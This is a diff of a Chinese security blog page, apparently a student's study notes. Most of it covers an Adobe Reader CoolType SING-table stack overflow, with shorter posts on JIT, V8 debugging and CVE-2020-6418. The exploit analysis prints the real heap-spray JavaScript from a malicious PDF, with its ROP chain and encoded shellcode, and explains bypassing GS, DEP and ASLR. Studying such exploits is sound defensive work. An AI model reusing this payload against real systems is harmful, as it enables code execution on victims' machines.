+<h3 id="JS堆喷射代码"><a href="#JS堆喷射代码" class="headerlink" title="JS堆喷射代码"></a>JS堆喷射代码</h3><p>在第一个object处找到OpenAction,表示在第11个obj中，pdf运行时会执行里面脚本。</p>
+<p><img src="https://i.loli.net/2020/07/24/a3IvshLZowWm1xn.png" alt="捕获.PNG"></p>
+<p>进入第11个obj，表示执行的js代码位于第12个obj中。</p>
+<p><img src="https://i.loli.net/2020/07/24/yxZ5nCGAFtvorkJ.png" alt="捕获.PNG"></p>
+<p>进入第12个obj，发现实现堆喷射的js脚本。代码是经过混淆的，简单整理后获得js代码。（此处使用大佬整理好的了）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var shellcode &#x3D; unescape( &#39;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ud7da%u82ba%ube98%ud9de%u2474%u5ef4%uc931%u31b1%uee83%u31fc%u1456%u5603%u7a96%u224b%uf87e%udbb4%u9d7e%u3e3d%u9d4f%u4a5a%u2dff%u1e28%uc6f3%u8b7c%uab80%ubca8%u0121%uf38f%u3ab2%u92f3%u4130%u7520%u8a09%u7435%uf74e%u24b4%u7307%ud96a%uc92c%u52b7%udf7e%u87bf%ude36%u19ee%ub94d%u9b30%ub182%u8378%ufcc7%u3833%u8a33%ue8c5%u730a%ud569%u86a3%u1173%u7903%u6b06%u0470%ua811%ud20b%u2b94%u91ab%u900f%u754a%u53c9%u3240%u3c9d%uc544%u3772%u4e70%u9875%u14f1%u3c52%uce5a%u65fb%ua106%u7504%u1ee9%ufda1%u4a07%u5fd8%u8d4d%uda6e%u8d23%ue570%ue613%u6e41%u71fc%ua55e%u8eb9%ue414%u06eb%u7cf1%u4aae%uab02%u72ec%u5e81%u808c%u2a99%ucd89%uc61d%u5ee3%ue8c8%u5e50%u8ad9%ucc37%u6281%u74d2%u7b23&#39; );</span><br><span class="line">var nop &#x3D; unescape( &quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; );</span><br><span class="line">while (nop.length + 20 + 8 &lt; 65536)</span><br><span class="line"> nop+&#x3D;nop;</span><br><span class="line">d &#x3D; nop.substring(0, (0x0c0c-0x24)&#x2F;2);</span><br><span class="line">d +&#x3D; shellcode;</span><br><span class="line">d +&#x3D; nop;</span><br><span class="line">e &#x3D; d.substring(0, 65536&#x2F;2);</span><br><span class="line">while(e.length &lt; 0x80000)</span><br><span class="line"> e +&#x3D; e;</span><br><span class="line">h &#x3D; e.substring(0, 0x80000 - (0x1020-0x08) &#x2F; 2);</span><br><span class="line">var slide &#x3D; new Array();</span><br><span class="line">for (i&#x3D;0;i&lt;0x1f0;i++)</span><br><span class="line"> slide[i]&#x3D;h+&quot;s&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>从TableEntry结构入口偏移0x11C即使SING表的真实数据，即从“00 00 01 00”开始的部分，接着再偏移0x10即可找到uniqueName域。</p>
+<p><img src="https://i.loli.net/2020/07/24/Ttae68OBCbc9GnL.png" alt="uniquename.PNG"></p>
+<p>执行strcat后会将“58 E0 8D AD”起始部分复制到ebp的指定地址，直到遇见NULL字符.</p>
+<h3 id="OD动态调试"><a href="#OD动态调试" class="headerlink" title="OD动态调试"></a>OD动态调试</h3><ul>
+<li>打开AR,OD中附加进程Cooltype.dll,溢出点strcat处下断点。</li>
+</ul>
+<p><img src="https://i.loli.net/2020/07/24/3AdJB9OGqLC2aHz.png" alt="捕获.PNG"></p>
+<ul>
+<li>溢出前，源地址数据如下，是SING表中的uniqueName字段的内容：</li>
+</ul>
+<p><img src="https://i.loli.net/2020/07/24/xjGeuh3y5vw1TKn.png" alt="捕获.PNG"></p>
+<p>正常情况下uniqueName字段为28字节，远小于栈空间大小0x104，就不会发生溢出。但是如果经过特殊构造，基于strcat复制内存时的特性（遇见NULL才停止）则会出现溢出。</p>
+<ul>
+<li>单步执行strcat函数后，目标地址位于栈中，站遭破坏，发生栈溢出。</li>
+</ul>
+<p><img src="https://i.loli.net/2020/07/24/1PhXAiMLfqOld2j.png" alt="捕获.PNG"></p>
+<ul>
+<li>将上面复制进去的数据下内存访问断点，执行，直到遇到call。但是这一步我始终跳不过去，程序往往会直接终止。后面我直接把call改成了retn，成功跳过，但是在内存访问断点之后遇到一个call又会终止程序，很糟心。</li>
+</ul>
+<h2 id="0x03-exploit分析"><a href="#0x03-exploit分析" class="headerlink" title="0x03 exploit分析"></a>0x03 exploit分析</h2><p>漏洞成因：Cooltype.dll中使用strcat函数时未对uniqueName字段的字符串长度进行检查，直接复制到固定大小的栈空间，最终导致栈溢出，攻击者篡改了TTF文件，在pdf文件中嵌入了JS脚本。</p>
+<h2 id="0x04-知识总结"><a href="#0x04-知识总结" class="headerlink" title="0x04 知识总结"></a>0x04 知识总结</h2><h3 id="绕过GS"><a href="#绕过GS" class="headerlink" title="绕过GS"></a>绕过GS</h3><ul>
+<li>通过安全cookie的检查，可以很好的探测栈是否被破坏/溢出；但是其也有很大弊端：只有在函数返回前，才会去检查security cookie，在之前是没有任何保护措施的.</li>
+<li>只要在安全cookie被检查之前劫持程序流程，就可无视GS保护，如OD中所示，产生溢出后，下内存访问断点，会有call 栈内数据的操作，由此直接劫持程序流程，从而绕过GS</li>
+</ul>
+<h3 id="绕过DEP"><a href="#绕过DEP" class="headerlink" title="绕过DEP"></a>绕过DEP</h3><ul>
+<li>通过构造ROP链，利用程序自身加载的库文件中的指令，来拼接出一系列指令去执行</li>
+<li>通过构造ROP链，利用程序自身加载的库文件中的指令，来拼接出一系列指令去执行</li>
+<li>进一步调用memcpy将shellcode复制到此空间，从而实现shellcode的执行，绕过DEP</li>
+</ul>
+<h3 id="绕过ASLR"><a href="#绕过ASLR" class="headerlink" title="绕过ASLR"></a>绕过ASLR</h3><ul>
+<li>开启ASLR后，其对堆基址做了随机化处理，但对于Heap Spray来说是无效的</li>
+<li>不管怎样对堆基址进行随机化，其基址总会出现在较低的内存空间，远远小于堆喷射所需的0x0c0c0c0c地址，因此，Heap spray 完全可以绕过 ASLR </li>
+</ul>
+<h3 id="调试思路总结"><a href="#调试思路总结" class="headerlink" title="调试思路总结"></a>调试思路总结</h3><ul>
+<li>构造恶意数据，实现栈溢出</li>
+<li>函数返回前（安全cookie检查前），调用恶意数据中的地址，开始实施ROP</li>
+<li>通过ROP，劫持执行流程指向0x0C0C0C0C</li>
+<li>js堆喷射覆盖地址0x0C0C0C0C，从而执行另一块ROP</li>
+<li>ROP块中为进程申请可执行权限的内存空间，并将shellcode复制其中</li>
+<li>shellcode执行，成功利用！</li>
+</ul>
+<blockquote>
+<p>太难啦OD动态调试调不出来！到底是因为啥子啊啊啊啊啊</p>
+</blockquote>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" rel="tag">漏洞战争</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-JIT学习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/17/JIT%E5%AD%A6%E4%B9%A0/" class="article-date">
+      <time datetime="2020-07-17T07:40:39.740Z" itemprop="datePublished">2020-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/17/JIT%E5%AD%A6%E4%B9%A0/">JIT学习</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="JIT原理"><a href="#JIT原理" class="headerlink" title="JIT原理"></a>JIT原理</h2><p>Just In Time编译，也叫运行时编译，不同于C/C++语言直接被翻译成机器指令，javac把java的源文件翻译成了class文件，而class文件中全都是java字节码，那么，JVM在加载了这些class文件以后，针对这些字节码，逐条取出，逐条执行，这种方法就是解释执行。</p>
+<p>还有一种，就是将java字节码重新编译优化，生成机器码，让CPU直接执行，这样编出来的代码效率更高，通常我们不必把所有的java方法都编译成机器码，只需要把调用最频繁，占据CPU时间最长的方法找出来将其编译成机器码，这种调用最频繁的java方法就是我们常说的热点方法。</p>
+<h2 id="技术点"><a href="#技术点" class="headerlink" title="技术点"></a>技术点</h2><p>从大的框架，就是申请一块既有写权限又有执行权限的内存，然后把你要编译的java方法，翻译成机器码，写入到这块内存里，当再需要调用原来的java方法时，就转向调用这块内存。</p>
+<p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> #include&lt;stdio.h&gt;</span><br><span class="line">int inc(int a) &#123;</span><br><span class="line">    return a + 1;</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">    printf(&quot;%d\n&quot;, inc(3));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>objdump -d 1</code>查看它的机器码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0000000000400526 &lt;inc&gt;:</span><br><span class="line">  400526:	55                   	push   %rbp#保存上一个栈帧的基址，并把当前的栈指针赋给栈基址寄存器</span><br><span class="line">  400527:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">  40052a:	89 7d fc             	mov    %edi,-0x4(%rbp)#把edi存到栈上。在x64处理器上，前6个参数都是使用寄存器传参的。第一个参数会使用rdi，第二个参数使用 rsi，等等。所以 edi 里存的其实就是第一个参数，也就是整数 3</span><br><span class="line">  40052d:	8b 45 fc             	mov    -0x4(%rbp),%eax#把上一步存到栈上的那个整数再存进 eax 中</span><br><span class="line">  400530:	83 c0 01             	add    $0x1,%eax#把 eax 加上 1， 然后就退栈，返回。按照x64的规定（ABI），返回值通过eax传递</span><br><span class="line">  400533:	5d                   	pop    %rbp</span><br><span class="line">  400534:	c3                   	retq</span><br></pre></td></tr></table></figure>
+
+<p>我们发现，第三局第四局好像没有必要，gcc默认情况下生成的机器码有点没必要，它总要把入参放到栈上，但其实我们是可以直接把参数从rdi中放入到rax中的，在运行时修改inc的逻辑即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> #include&lt;stdio.h&gt;</span><br><span class="line"> #include&lt;memory.h&gt;</span><br><span class="line"> #include&lt;sys&#x2F;mman.h&gt;</span><br><span class="line">typedef int (* inc_func)(int a); </span><br><span class="line">int main() &#123;</span><br><span class="line">    char code[] &#x3D; &#123; </span><br><span class="line">        0x55,             &#x2F;&#x2F; push rbp</span><br><span class="line">        0x48, 0x89, 0xe5, &#x2F;&#x2F; mov rsp, rbp</span><br><span class="line">        0x89, 0xf8,       &#x2F;&#x2F; mov edi, eax</span><br><span class="line">        0x83, 0xc0, 0x01, &#x2F;&#x2F; add $1, eax</span><br><span class="line">        0x5d,             &#x2F;&#x2F; pop rbp</span><br><span class="line">        0xc3              &#x2F;&#x2F; ret</span><br><span class="line">    &#125;;  </span><br><span class="line">    void * temp &#x3D; mmap(NULL, sizeof(code), PROT_WRITE | PROT_EXEC,</span><br><span class="line">            MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); </span><br><span class="line">    memcpy(temp, code, sizeof(code));</span><br><span class="line">    inc_func p_inc &#x3D; (inc_func)temp;</span><br><span class="line">    printf(&quot;%d\n&quot;, p_inc(7));</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>mmap申请了一块有写权限和执行权限的内存，然后将手写的机器码考进去，使用一个函数指针指向这块内存并调用它，通过这种方式就可以执行这一段手写的机器码了。</p>
+<p>我们通过手写机器码将原来的inc函数代替掉了，在新的例子中，我们使用程序中定义的数据来重新造了一个inc函数，这种在运行过程创建新的函数的方式，就是JIT的核心操作。</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">chrome知识点</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-V8漏洞初学习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/17/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/" class="article-date">
+      <time datetime="2020-07-17T06:32:27.475Z" itemprop="datePublished">2020-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/17/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/">V8漏洞初学习</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="V8基础"><a href="#V8基础" class="headerlink" title="V8基础"></a>V8基础</h1><p>v8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的</p>
+<blockquote>
+<p>v8编译后二进制名称叫d8.</p>
+</blockquote>
+<h2 id="allow-natives-syntax选项"><a href="#allow-natives-syntax选项" class="headerlink" title="allow-natives-syntax选项"></a>allow-natives-syntax选项</h2><p>定义了一些v8运行时支持函数，以便于本地调试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">browser&#x2F;x64.release$ .&#x2F;d8 --allow-natives-syntax</span><br><span class="line">V8 version 7.5.0 (candidate)</span><br><span class="line">d8&gt; var a &#x3D; [1, 2, 3];</span><br><span class="line">undefined</span><br><span class="line">d8&gt; %DebugPrint(a);</span><br><span class="line">0x2ebcfb54dd41 &lt;JSArray[3]&gt;</span><br><span class="line">[1, 2, 3]</span><br><span class="line">d8&gt; %SystemBreak();</span><br><span class="line">Trace&#x2F;breakpoint trap (core dumped)</span><br></pre></td></tr></table></figure>
+
+<p>在加载d8时加入此选项可以在js中调试本地运行时函数：</p>
+<p><code>%DebugPrint(obj) 输出对象地址</code><br><code>%SystemBreak() 触发调试中断主要结合gdb等调试器使用</code></p>
+<p>gdb的gdbinit脚本可以使gdb中就能可视化显示v8的对象结构，将该脚本下载重命名为gdbinit_v8并添加至/.gdbinit脚本：</p>
+<p><code>source /path/to/gdbinit_v8</code></p>
+<p>下面将allow-natives-syntax选项和gdbinit结合使用，编写test.js：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var a &#x3D; [1,2,3];</span><br><span class="line">var b &#x3D; [1.1, 2.2, 3.3];</span><br><span class="line">var c &#x3D; [a, b];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();  &#x2F;&#x2F;触发第一次调试</span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();  &#x2F;&#x2F;触发第二次调试</span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();  &#x2F;&#x2F;触发第三次调试</span><br></pre></td></tr></table></figure>
+
+<p>gdb运行d8:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;ctf&#x2F;browser&#x2F;x64.release$ gdb .&#x2F;d8</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: x64.release&#x2F;d8 --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">[New Thread 0x7ff87fde9700 (LWP 18393)]</span><br><span class="line">[New Thread 0x7ff87f5e8700 (LWP 18394)]</span><br><span class="line">[New Thread 0x7ff87ede7700 (LWP 18395)]</span><br><span class="line">0x12e891f8df11 &lt;JSArray[3]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现，程序打印了数组对象a的内存地址，并且SystemBreak触发了gdb的中断。</p>
+<p>此时就可以利用上面已经加入的gdbinit脚本中包含的命令调试对象结构，主要使用job命令，可以可视化显示js对象的内存结构。</p>
+<p>v8在内存中只有数字和对象梁忠表示，为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。对象a世内存地址为0x12e891f8df10。</p>
+<p>telescope命令查看内存数据。</p>
+<p>在gdb中使用c命令继续运行，发现停在了第二次SystemBreak的地方，然后用job命令查看第二个对象b的地址，根据上面的套路，可知对象b的实际内存地址为0x244de278df58.</p>
+<h2 id="v8的对象结构"><a href="#v8的对象结构" class="headerlink" title="v8的对象结构"></a>v8的对象结构</h2><p>和vb等语言的解析类似，JS是一种解释之行语言，v8本质上是一个JS的解释执行程序。</p>
+<p>首先，需要了解v8解析执行javaScript语句的基本流程：v8在读取js语句后，首先将这条语句解析为语法树，然后通过解释器将语法树变为中间语言的Bytecode字节码，最后利用内部虚拟机将字节码转换为机器码来执行。</p>
+<p>为了加快解析过程，v8会记录下某条语法树的执行次数，当v8发现某条语法树执行次数超过一定阈值后，就会将这段语法树直接转换为机器码，后续再调用这条js语句时，v8会直接调用这条语法树对应的机器码，而不用再转换为byte code字节码，大大加快了执行速度，这就是著名的JIT优化。</p>
+<p>但是这样的性能优化虽然加快了程序的执行，但也带来了很多的安全问题，如果v8本来通过JIT引擎为某段语法树比如a+b假发计算生成了一段机器码<code>add eax,ebx</code>，而在后续某个时刻，攻击者在js引擎中突然改变了a和b的对象类型，而JIT引擎并没有识别出这个改变，就会造成a和b对象在假发运算时的类型混淆。</p>
+<p>一个对象在内存中布局大致如下：</p>
+<ul>
+<li>map:表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型</li>
+<li>prototype：prototype</li>
+<li>elements:对象元素</li>
+<li>length:元素个数</li>
+<li>properties:属性</li>
+</ul>
+<p>数组对象的elements其实也是个对象，这些元素在内存中的分布正好位于数组对象的上方，即低地址处，也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的elements指向了存储元素内容的内存地址，如图：</p>
+<p><img src="https://i.loli.net/2020/07/17/JCK5EwuRAc8SQTn.png" alt="1.PNG"></p>
+<p>由于浏览器的漏洞利用几乎都要基于对象结构来实现，因此熟悉上述v8对象的内存布局，对后续会很有帮助。</p>
+<blockquote>
+<p>上述内存布局是FloatArray的内存布局，其他类型的Array与其类似，但不完全相同。</p>
+</blockquote>
+<h2 id="浏览器V8的解题步骤"><a href="#浏览器V8的解题步骤" class="headerlink" title="浏览器V8的解题步骤"></a>浏览器V8的解题步骤</h2><p>一般浏览器的出题有两种，以中山市diff修改v8引擎源代码，人为制造出一个漏洞，另一种是直接采用某个cve漏洞。出题者通常会提供一个idf文件，或直接给出一个编译后diff补丁后的浏览器程序，如果只给了一个diff文件，则需要我们自己去下载相关commit源码，然后本地打上diff补丁，编译出浏览器程序在进行本地调试。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.codercto.com/a/81538.html" target="_blank" rel="noopener">https://www.codercto.com/a/81538.html</a></p>
+<p>后续需要实践做一下这个ctf题目。</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome-bug/" rel="tag">chrome_bug</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-CVE-2020-6418" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/17/CVE-2020-6418/" class="article-date">
+      <time datetime="2020-07-17T05:11:49.434Z" itemprop="datePublished">2020-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/17/CVE-2020-6418/">CVE-2020-6418</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>(资料来自绿盟科技)</p>
+<p>2020年2月24日，google针对桌面版chrome浏览器发布更新以解决多个漏洞，包括已被发现的在野利用的高危漏洞CVE-2020-6418.</p>
+<p>CVE-2020-6418存在于V8中的类型混淆漏洞，V8是chrome的开源JavaScript和WebAssembly引擎，该洞由Google威胁分析小组的Clement Lecigne发现并上报。</p>
+<p>受影响产品版本：</p>
+<p>Google Chrome Version&lt;80.0.3987.122</p>
+<p>适用于windows,Mac,Linux.</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://blog.nsfocus.net/cve-2020-6418" target="_blank" rel="noopener">http://blog.nsfocus.net/cve-2020-6418</a></p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chrome%E8%B0%83%E8%AF%95/" rel="tag">chrome调试</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    </nav>
+  
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2020 Sinky-wang
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="http://Visionaryxx.github.io" target="_blank">Visionary'blog</a> by Visionary
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >海贼到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
 <script src="/js/main.js"></script>
 
-	
-		
-<script src="https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min.js"></script>
 
-		
-<script src="https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
 
-	
-	
-		<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-	
-<meta name="generator" content="Hexo 4.2.0"></head>
 
-<body>
-	<header id="header">
-    <a id="title" href="/" class="logo">Sinky-wang</a>
 
-	<ul id="menu">
-		<li class="menu-item">
-			<a href="/about" class="menu-item-link">ABOUT</a>
-		</li>
-		
-		<li class="menu-item">
-			<a href="https://github.com/wujun234/uid-generator-spring-boot-starter" class="menu-item-link" target="_blank">
-				UidGenerator
-			</a>
-		</li>
-		<li class="menu-item">
-			<a href="https://github.com/wujun234" class="menu-item-link" target="_blank">
-				<i class="fa fa-github fa-2x"></i>
-			</a>
-		</li>
-	</ul>
-</header>
 
-	
-<div id="sidebar">
-	<button id="sidebar-toggle" class="toggle" ><i class="fa fa-arrow-right " aria-hidden="true"></i></button>
-	
-	<div id="site-toc">
-		<input id="search-input" class="search-input" type="text" placeholder="search...">
-		<div id="tree">
-			
 
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/08/13/CVE-2006-3439/">
-										CVE-2006-3439
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/07/13/CVE-2019-0708/">
-										CVE-2019-0708
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/07/14/CVE-2019-0808/">
-										CVE-2019-0808
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/05/12/CVE-2019-5786/">
-										CVE-2019-5786
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/07/17/CVE-2020-6418/">
-										CVE-2020-6418
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/07/14/Chrome%E8%B0%83%E8%AF%95%20CVE-2019-5768/">
-										Chrome调试 CVE-2019-5768
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/07/17/JIT%E5%AD%A6%E4%B9%A0/">
-										JIT学习
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/05/08/Loving%20strangers/">
-										Loving strangers
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
-							</ul>
-			
-							<ul>
-								<li class="file">
-									<a href="/2020/07/30/SQL%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%95%B4%E7%90%86/">
-										SQL学习与整理
-									</a>
-								</li>
-								<div class="article-toc" style="display: none;"></div>
